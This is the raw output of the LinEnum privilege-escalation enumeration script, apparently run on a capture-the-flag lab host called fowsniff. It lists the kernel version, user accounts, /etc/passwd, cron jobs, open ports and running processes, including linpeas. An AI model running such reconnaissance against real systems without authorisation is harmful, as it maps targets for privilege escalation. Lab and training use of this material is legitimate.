
[00;31m#########################################################[00m
[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
[00;31m#########################################################[00m
[00;33m# www.rebootuser.com[00m
[00;33m# version 0.982[00m

[-] Debug Info
[00;33m[+] Thorough tests = Disabled[00m


[00;33mScan started at:
Wed Nov 20 02:54:27 EST 2024
[00m

[00;33m### SYSTEM ##############################################[00m
[00;31m[-] Kernel information:[00m
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


[00;31m[-] Kernel information (continued):[00m
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018


[00;31m[-] Specific release information:[00m
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[00;31m[-] Hostname:[00m
fowsniff


[00;33m### USER/GROUP ##########################################[00m
[00;31m[-] Current user/group info:[00m
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)


[00;31m[-] Users that have previously logged onto the system:[00m
Username         Port     From             Latest
root                                       Wed Dec 31 19:00:10 -0500 1969
stone            pts/2    192.168.7.36     Tue Mar 13 14:52:13 -0400 2018
baksteen         pts/2    10.6.18.190      Wed Nov 20 02:53:41 -0500 2024


[00;31m[-] Who else is logged on:[00m
 02:54:27 up  1:23,  2 users,  load average: 0.44, 0.10, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
baksteen pts/0    10.6.18.190      02:53   26.00s  0.10s  0.03s /bin/sh ./linpeas.sh
baksteen pts/2    10.6.18.190      02:53    3.00s  0.02s  0.00s /bin/bash ./LinEnum.sh


[00;31m[-] Group memberships:[00m
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(postfix) gid=115(postfix) groups=115(postfix)
uid=109(dovecot) gid=117(dovecot) groups=117(dovecot),8(mail)
uid=110(dovenull) gid=118(dovenull) groups=118(dovenull)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(stone) gid=1000(stone) groups=1000(stone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),119(lpadmin),120(sambashare)
uid=1001(parede) gid=100(users) groups=100(users),1005(parede)
uid=1002(mauer) gid=100(users) groups=100(users),1002(mauer)
uid=1003(sciana) gid=100(users) groups=100(users),1006(sciana)
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
uid=1005(mursten) gid=100(users) groups=100(users),1003(mursten)
uid=1006(tegel) gid=100(users) groups=100(users),1008(tegel)
uid=1007(seina) gid=100(users) groups=100(users),1007(seina)
uid=1008(mustikka) gid=100(users) groups=100(users),1004(mustikka)


[00;31m[-] It looks like we have some admin users:[00m
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(stone) gid=1000(stone) groups=1000(stone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),119(lpadmin),120(sambashare)


[00;31m[-] Contents of /etc/passwd:[00m
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
postfix:x:108:115::/var/spool/postfix:/bin/false
dovecot:x:109:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:110:118:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
mauer:x:1002:100::/home/mauer:/bin/bash
sciana:x:1003:100::/home/sciana:/bin/bash
baksteen:x:1004:100::/home/baksteen:/bin/bash
mursten:x:1005:100::/home/mursten:/bin/bash
tegel:x:1006:100::/home/tegel:/bin/bash
seina:x:1007:100::/home/seina:/bin/bash
mustikka:x:1008:100::/home/mustikka:/bin/bash


[00;31m[-] Super user account(s):[00m
root


[00;31m[-] Are permissions on /home directories lax:[00m
total 44K
drwxr-xr-x 11 root     root     4.0K Mar  8  2018 .
drwxr-xr-x 22 root     root     4.0K Mar  9  2018 ..
drwxrwx---  7 baksteen baksteen 4.0K Nov 20 02:54 baksteen
drwxrwx---  3 mauer    mauer    4.0K Mar 11  2018 mauer
drwxrwx---  3 mursten  mursten  4.0K Mar 11  2018 mursten
drwxrwx---  3 mustikka mustikka 4.0K Mar 11  2018 mustikka
drwxrwx---  3 parede   parede   4.0K Mar 11  2018 parede
drwxrwx---  3 sciana   sciana   4.0K Mar 11  2018 sciana
drwxrwx---  4 seina    seina    4.0K Mar 11  2018 seina
drwxrwx---  4 stone    stone    4.0K Mar 13  2018 stone
drwxrwx---  3 tegel    tegel    4.0K Mar 11  2018 tegel


[00;33m### ENVIRONMENTAL #######################################[00m
[00;31m[-] Environment information:[00m
XDG_SESSION_ID=6
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.6.18.190 54954 22
SSH_TTY=/dev/pts/2
USER=baksteen
PATH=/home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/baksteen
PWD=/dev/shm
LANG=en_US.UTF-8
HOME=/home/baksteen
SHLVL=2
LOGNAME=baksteen
SSH_CONNECTION=10.6.18.190 54954 10.10.191.213 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1004
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[00;31m[-] Path information:[00m
/home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
drwxr-xr-x 2 root root  4096 Mar  8  2018 /bin
drwxr-xr-x 2 root root  4096 Mar  8  2018 /sbin
drwxr-xr-x 2 root root 20480 Mar  8  2018 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 12  2016 /usr/games
drwxr-xr-x 2 root root  4096 Mar  8  2018 /usr/local/bin
drwxr-xr-x 2 root root  4096 Mar  8  2018 /usr/local/games
drwxr-xr-x 2 root root  4096 Mar  8  2018 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Mar  8  2018 /usr/sbin


[00;31m[-] Available shells:[00m
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[00;31m[-] Current umask value:[00m
0022
u=rwx,g=rx,o=rx


[00;31m[-] umask value as specified in /etc/login.defs:[00m
UMASK		022


[00;31m[-] Password and storage information:[00m
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


[00;33m### JOBS/TASKS ##########################################[00m
[00;31m[-] Cron jobs:[00m
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Mar  8  2018 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder


[00;31m[-] Crontab contents:[00m
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[00;31m[-] Systemd timers:[00m
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2024-11-20 06:06:02 EST  3h 11min left Wed 2024-11-20 01:31:36 EST  1h 22min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2024-11-20 09:33:49 EST  6h left       Wed 2024-11-20 01:31:36 EST  1h 22min ago apt-daily.timer              apt-daily.service
Thu 2024-11-21 01:46:32 EST  22h left      Wed 2024-11-20 01:46:32 EST  1h 7min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
[2mEnable thorough tests to see inactive timers[00m


[00;33m### NETWORKING  ##########################################[00m
[00;31m[-] Network and IP info:[00m
eth0      Link encap:Ethernet  HWaddr 02:ea:7f:5a:06:c3  
          inet addr:10.10.191.213  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::ea:7fff:fe5a:6c3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:529238 errors:0 dropped:0 overruns:0 frame:0
          TX packets:526239 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:52876761 (52.8 MB)  TX bytes:141919336 (141.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:160 errors:0 dropped:0 overruns:0 frame:0
          TX packets:160 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:11840 (11.8 KB)  TX bytes:11840 (11.8 KB)


[00;31m[-] ARP history:[00m
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0


[00;31m[-] Nameserver(s):[00m
nameserver 10.0.0.2


[00;31m[-] Default route:[00m
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0


[00;31m[-] Listening TCP:[00m
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::110                  :::*                    LISTEN      -               
tcp6       0      0 :::143                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               


[00;31m[-] Listening UDP:[00m
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               


[00;33m### SERVICES #############################################[00m
[00;31m[-] Running processes:[00m
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  1.1  37624  5768 ?        Ss   01:31   0:00 /sbin/init splash
root         2  0.0  0.0      0     0 ?        S    01:31   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    01:31   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   01:31   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    01:31   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    01:31   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    01:31   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    01:31   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    01:31   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    01:31   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   01:31   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   01:31   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    01:31   0:00 [xenwatch]
root        15  0.0  0.0      0     0 ?        S    01:31   0:00 [xenbus]
root        17  0.0  0.0      0     0 ?        S    01:31   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   01:31   0:00 [writeback]
root        19  0.0  0.0      0     0 ?        SN   01:31   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        S<   01:31   0:00 [crypto]
root        21  0.0  0.0      0     0 ?        S<   01:31   0:00 [kintegrityd]
root        22  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        23  0.0  0.0      0     0 ?        S<   01:31   0:00 [kblockd]
root        24  0.0  0.0      0     0 ?        S<   01:31   0:00 [ata_sff]
root        25  0.0  0.0      0     0 ?        S<   01:31   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   01:31   0:00 [devfreq_wq]
root        27  0.0  0.0      0     0 ?        S    01:31   0:00 [kworker/u30:1]
root        29  0.0  0.0      0     0 ?        S    01:31   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        S<   01:31   0:00 [vmstat]
root        31  0.0  0.0      0     0 ?        S    01:31   0:00 [fsnotify_mark]
root        32  0.0  0.0      0     0 ?        S    01:31   0:00 [ecryptfs-kthrea]
root        48  0.0  0.0      0     0 ?        S<   01:31   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S<   01:31   0:00 [acpi_thermal_pm]
root        50  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S    01:31   0:00 [scsi_eh_0]
root        59  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        60  0.0  0.0      0     0 ?        S<   01:31   0:00 [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    01:31   0:00 [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   01:31   0:00 [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   01:31   0:00 [bioset]
root        69  0.0  0.0      0     0 ?        S<   01:31   0:00 [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S    01:31   0:00 [kworker/0:2]
root        83  0.0  0.0      0     0 ?        S<   01:31   0:00 [deferwq]
root        84  0.0  0.0      0     0 ?        S<   01:31   0:00 [charger_manager]
root       151  0.0  0.0      0     0 ?        S<   01:31   0:00 [kpsmoused]
root       152  0.0  0.0      0     0 ?        S<   01:31   0:00 [ttm_swap]
root       175  0.0  0.0      0     0 ?        S    01:31   0:00 [jbd2/xvda1-8]
root       176  0.0  0.0      0     0 ?        S<   01:31   0:00 [ext4-rsv-conver]
root       189  0.0  0.0      0     0 ?        S<   01:31   0:00 [kworker/0:1H]
root       213  0.0  0.5  27704  2944 ?        Ss   01:31   0:00 /lib/systemd/systemd-journald
root       230  0.0  0.0      0     0 ?        S    01:31   0:00 [kauditd]
root       258  0.0  1.0  45464  5016 ?        Ss   01:31   0:00 /lib/systemd/systemd-udevd
systemd+   334  0.0  0.4 100324  2484 ?        Ssl  01:31   0:00 /lib/systemd/systemd-timesyncd
root       548  0.0  0.5  28544  2988 ?        Ss   01:31   0:00 /lib/systemd/systemd-logind
syslog     549  0.0  0.6 256392  3356 ?        Ssl  01:31   0:00 /usr/sbin/rsyslogd -n
message+   571  0.0  0.7  42900  3752 ?        Ss   01:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       614  0.0  0.5  29008  2948 ?        Ss   01:31   0:00 /usr/sbin/cron -f
root       617  0.0  1.2 275884  6292 ?        Ssl  01:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       643  0.0  0.5  16124  2884 ?        Ss   01:31   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       688  0.0  1.2  65508  6232 ?        Ss   01:31   0:00 /usr/sbin/sshd -D
root       715  0.0  0.4  15752  2212 ttyS0    Ss+  01:31   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root       716  0.0  0.3  15936  1796 tty1     Ss+  01:31   0:00 /sbin/agetty --noclear tty1 linux
root       742  0.0  0.5  18036  2672 ?        Ss   01:31   0:00 /usr/sbin/dovecot
dovecot    751  0.0  0.1   9524   968 ?        S    01:31   0:00 dovecot/anvil
root       752  0.0  0.4   9656  2300 ?        S    01:31   0:00 dovecot/log
root       761  0.0  0.8  71584  4248 ?        Ss   01:31   0:00 /usr/sbin/apache2 -k start
www-data   764  0.2  1.4 820828  7132 ?        Sl   01:31   0:13 /usr/sbin/apache2 -k start
www-data   765  0.2  1.4 820976  7324 ?        Sl   01:31   0:12 /usr/sbin/apache2 -k start
root       940  0.0  0.9  65408  4532 ?        Ss   01:31   0:00 /usr/lib/postfix/sbin/master
postfix    941  0.0  0.8  67476  4392 ?        S    01:31   0:00 pickup -l -t unix -u -c
postfix    942  0.0  0.8  67524  4440 ?        S    01:31   0:00 qmgr -l -t unix -u
root      1088  0.0  0.0      0     0 ?        S    01:46   0:00 [kworker/0:0]
baksteen  1398  0.0  0.9  45276  4564 ?        Ss   02:49   0:00 /lib/systemd/systemd --user
baksteen  1400  0.0  0.3  61076  1820 ?        S    02:49   0:00 (sd-pam)
root      1524  0.0  1.3  92804  6760 ?        Ss   02:53   0:00 sshd: baksteen [priv]
baksteen  1543  0.0  0.6  92804  3312 ?        S    02:53   0:00 sshd: baksteen@pts/0
baksteen  1544  0.0  0.9  22268  4976 pts/0    Ss   02:53   0:00 -bash
root      1558  0.0  1.3  92804  6928 ?        Ss   02:53   0:00 sshd: baksteen [priv]
baksteen  1576  0.0  0.6  92804  3148 ?        S    02:53   0:00 sshd: baksteen@pts/2
baksteen  1577  0.0  0.9  22268  4976 pts/2    Ss   02:53   0:00 -bash
baksteen  1597  0.2  0.6   5944  3184 pts/0    S+   02:54   0:00 /bin/sh ./linpeas.sh
baksteen  1598  0.0  0.1   7296   748 pts/0    S+   02:54   0:00 tee linplog
root      1661  0.0  0.0      0     0 ?        S    02:54   0:00 [kworker/u30:2]
postfix   8812  0.0  0.9  67580  4560 ?        S    02:54   0:00 cleanup -z -t unix -u -c
postfix   8816  0.0  0.8  67484  4348 ?        S    02:54   0:00 trivial-rewrite -n rewrite -t unix -u -c
postfix   8827  0.0  1.1  67516  5612 ?        S    02:54   0:00 local -t unix
baksteen  9453  0.0  0.8  13512  4056 pts/2    S+   02:54   0:00 /bin/bash ./LinEnum.sh
baksteen  9454  0.0  0.1   7296   672 pts/2    S+   02:54   0:00 tee linelog
baksteen  9455  0.0  0.7  13556  3492 pts/2    S+   02:54   0:00 /bin/bash ./LinEnum.sh
baksteen  9456  0.0  0.1   7296   812 pts/2    S+   02:54   0:00 tee -a
baksteen  9458  0.0  0.1  92804   564 ?        Ss   02:54   0:00 gpg-agent --homedir /home/baksteen/.gnupg --use-standard-socket --daemon
baksteen 19180  0.0  0.3   5944  1568 pts/0    S+   02:54   0:00 /bin/sh ./linpeas.sh
baksteen 19181  0.0  0.7  28572  3604 pts/0    R+   02:54   0:00 find / ( -type f -or -type d ) -group baksteen -perm -g=w ! -path /proc/* ! -path /sys/* ! -path /home/baksteen/*
baksteen 19182  0.0  0.1  14224   940 pts/0    S+   02:54   0:00 grep -Ev \.tif$|\.tiff$|\.gif$|\.jpeg$|\.jpg|\.jif$|\.jfif$|\.jp2$|\.jpx$|\.j2k$|\.j2c$|\.fpx$|\.pcd$|\.png$|\.pdf$|\.flv$|\.mp4$|\.mp3$|\.gifv$|\.avi$|\.mov$|\.mpeg$|\.wav$|\.doc$|\.docx$|\.xls$|\.xlsx$|\.svg$
baksteen 19183  0.0  0.1   7588   912 pts/0    S+   02:54   0:00 awk -F/ {line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory
"}; pre=act }
baksteen 19184  0.0  0.1   7300   752 pts/0    S+   02:54   0:00 head -n 200
baksteen 19248  0.0  0.5  13556  2788 pts/2    S+   02:54   0:00 /bin/bash ./LinEnum.sh
baksteen 19249  0.0  0.6  37364  3276 pts/2    R+   02:54   0:00 ps aux


[00;31m[-] Process binaries and associated permissions (from above list):[00m
1016K -rwxr-xr-x 1 root root 1014K May 16  2017 /bin/bash
    0 lrwxrwxrwx 1 root root     4 Feb 17  2016 /bin/sh -> dash
 1.6M -rwxr-xr-x 1 root root  1.6M Feb  1  2018 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Feb  1  2018 /lib/systemd/systemd-journald
 608K -rwxr-xr-x 1 root root  605K Feb  1  2018 /lib/systemd/systemd-logind
 140K -rwxr-xr-x 1 root root  139K Feb  1  2018 /lib/systemd/systemd-timesyncd
 444K -rwxr-xr-x 1 root root  443K Feb  1  2018 /lib/systemd/systemd-udevd
  44K -rwxr-xr-x 1 root root   44K Nov 30  2017 /sbin/agetty
 476K -rwxr-xr-x 1 root root  476K Mar  1  2018 /sbin/dhclient
    0 lrwxrwxrwx 1 root root    20 Feb  1  2018 /sbin/init -> /lib/systemd/systemd
 220K -rwxr-xr-x 1 root root  219K Jan 12  2017 /usr/bin/dbus-daemon
 164K -rwxr-xr-x 1 root root  162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
  40K -rwxr-xr-x 1 root root   38K Jan 17  2018 /usr/lib/postfix/sbin/master
 648K -rwxr-xr-x 1 root root  647K Sep 18  2017 /usr/sbin/apache2
  44K -rwxr-xr-x 1 root root   44K Apr  5  2016 /usr/sbin/cron
  80K -rwxr-xr-x 1 root root   79K Feb 27  2018 /usr/sbin/dovecot
 588K -rwxr-xr-x 1 root root  586K Apr  5  2016 /usr/sbin/rsyslogd
 776K -rwxr-xr-x 1 root root  773K Jan 18  2018 /usr/sbin/sshd


[00;31m[-] /etc/init.d/ binary permissions:[00m
total 264
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rw-r--r--  1 root root  967 Mar  8  2018 .depend.boot
-rw-r--r--  1 root root  629 Mar  8  2018 .depend.start
-rw-r--r--  1 root root  724 Mar  8  2018 .depend.stop
-rwxr-xr-x  1 root root 5242 Mar 18  2016 dovecot
-rwxr-xr-x  1 root root 1105 Jan 24  2018 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 7972 Jan 17  2018 postfix
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
